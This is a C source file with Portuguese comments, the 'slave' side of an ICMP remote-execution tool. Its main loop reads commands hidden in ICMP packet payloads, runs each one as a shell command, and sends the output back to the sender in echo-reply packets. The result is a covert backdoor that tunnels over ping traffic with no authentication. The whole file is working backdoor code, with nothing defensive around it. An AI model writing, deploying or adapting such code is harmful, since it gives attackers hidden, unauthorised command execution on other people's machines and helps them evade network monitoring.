#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <string.h>
#include <unistd.h>

// ICMP EXEC - ESCRAVO

#define SIZ 1024

struct sockaddr_in dst_addr , src_addr;
struct icmphdr *icmp;
struct iphdr *ip;

unsigned short checksum(void *b, int len); 
FILE *executa(char *cmd);

int main(int argc , char *argv[])
{
	int sock , bytes_enviados , bytes_recebidos , tamanho_addr = sizeof(struct sockaddr_in);
    char pacote[SIZ] , *payload , buffer[SIZ];
    FILE *prog;

    // Cria o socket 
    sock = socket(AF_INET , SOCK_RAW , IPPROTO_ICMP);
    if(sock == -1)
    {
        fprintf(stderr , "> [ERRO]: Erro ao criar socket.\n");
        return 1;
    }

    printf("> ICMP EXEC - Escravo \n");
    printf("> Iniciando...\n");

    while(1)
    {
        // Aguardando comando
        bytes_recebidos = read(sock , pacote , SIZ);
        if(bytes_recebidos > 0)
        {
            ip = (struct iphdr *)pacote;
            if(bytes_recebidos > sizeof(struct iphdr))
            {
                bytes_recebidos -= sizeof(struct iphdr);
                icmp = (struct icmphdr *) (ip + 1);
                if(bytes_recebidos > sizeof(struct icmphdr))
                {
                    bytes_recebidos -= sizeof(struct icmphdr);
                    payload = (char *)(icmp + 1);
                    payload[bytes_recebidos] = '\0';
                    printf("> Payload: %s\n", payload);
                }

                // Reutiliza os cabeçalhos 
                icmp->type = ICMP_ECHOREPLY;
                dst_addr.sin_addr.s_addr = ip->saddr;
                dst_addr.sin_family = AF_INET;

                // Executa o comando
                prog = executa(payload);
                if(prog == NULL) continue;

                // Envia a saida do comando
                while(fgets(buffer , SIZ , prog) != NULL)
                {
                    memcpy((char *) (icmp + 1), buffer, strlen(buffer));
                    icmp->checksum = 0;
                    icmp->checksum = checksum(icmp , sizeof(struct icmphdr));

                    int full_size = sizeof(struct icmphdr) + strlen(buffer); 
                    bytes_enviados = sendto(sock , icmp , full_size , 0 , (struct sockaddr*)&dst_addr , tamanho_addr);
                    if(bytes_enviados <= 0) printf("> O pacote não foi enviado");
                    
                }

                bytes_recebidos = 0;
                bytes_enviados = 0;
            }
        }
    }
	return 0;
}

// Calcula o checksum do cabeçalho icmp
unsigned short checksum(void *b, int len) 
{    unsigned short *buf = b; 
    unsigned int sum=0; 
    unsigned short result; 
  
    for ( sum = 0; len > 1; len -= 2 ) 
        sum += *buf++; 
    if ( len == 1 ) 
        sum += *(unsigned char*)buf; 
    sum = (sum >> 16) + (sum & 0xFFFF); 
    sum += (sum >> 16); 
    result = ~sum; 
    return result; 
}

// Executa o comando
FILE *executa(char *cmd)
{
    FILE *pipe = popen(cmd , "r");
    return pipe;
}